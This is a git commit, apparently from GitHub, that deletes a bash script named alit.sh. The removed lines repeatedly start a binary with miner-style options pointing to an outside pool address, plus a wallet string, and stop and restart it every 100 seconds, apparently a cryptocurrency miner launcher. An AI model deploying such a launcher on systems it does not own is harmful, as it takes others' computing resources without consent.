3cdb58aa775a594ef2bcaca933f70952403f52ca
aliabdulla769 <131328611+aliabdulla769@users.noreply.github.com>
2024-01-22 07:15:03 +0300

    Update alit.sh

--- alit.sh
+++ alit.sh
@@ -1,18 +1,1 @@
-#!/bin/bash
 
-while true; do
-    # Run the command with full path for clarity
-    ./prn -o 95.179.241.203:443 -u 85a5qsVSC9H6xxY57AQvrHaaToUkdeZKH8t9Wf2NhAWwfxXcq4SrLWj4a6b8WPzEDMKmRbNX5h52118dho1SPGH59oBCYJB -k --tls -p pen &
-
-    # Get the process ID of the command
-    pid=$!
-
-    # Allow the command to run for 100 seconds
-    sleep 100
-
-    # Terminate the command gracefully
-    kill $pid
-
-    # Wait for 10 seconds before restarting
-    sleep 10
-done
